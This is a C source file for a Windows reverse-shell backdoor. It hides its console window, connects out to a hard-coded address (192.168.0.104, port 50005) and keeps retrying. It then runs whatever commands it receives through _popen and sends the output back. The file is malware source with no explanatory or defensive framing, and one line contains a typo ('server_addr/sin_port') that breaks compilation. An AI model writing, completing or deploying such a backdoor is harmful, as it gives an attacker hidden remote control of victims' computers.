#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>

#define bzero(p, size) (void) memset((p), 0, (size))

int sock;

void Shell()
{
	char buffer[1024];
	char container[1024];
	char total_response[18384];

	while(1)
	{
jump:
		bzero(buffer, sizeof(buffer));
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));

		recv(sock, buffer, sizeof(buffer), 0);

		if(strncmp("q", buffer, 1) == 0)
		{
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		else
		{
			FILE* fp;
			fp = _popen(buffer, "r");
			while(fgets(container, 1024, fp) != NULL)
				strcat(total_response, container);

			send(sock, total_response, sizeof(total_response), 0);
			fclose(fp);
		}
	}
}


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int CmdShow)
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);

	ShowWindow(stealth, 0);

	struct sockaddr_in server_addr;
	unsigned short server_port;
	char* server_ip;
	WSADATA wsaData;

	server_ip = "192.168.0.104";
	server_port = 50005;

	if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0)
		exit(1);

	sock = socket(AF_INET, SOCK_STREAM, 0);

	memset(&server_addr, 0, sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = inet_addr(server_ip);
	server_addr/sin_port = htons(server_port);

start:
	while(connect(sock, (struct sockaddr*) &server_addr, sizeof(server_addr)) != 0)
	{
		sleep(10);
		goto start;
	}
	Shell();
}
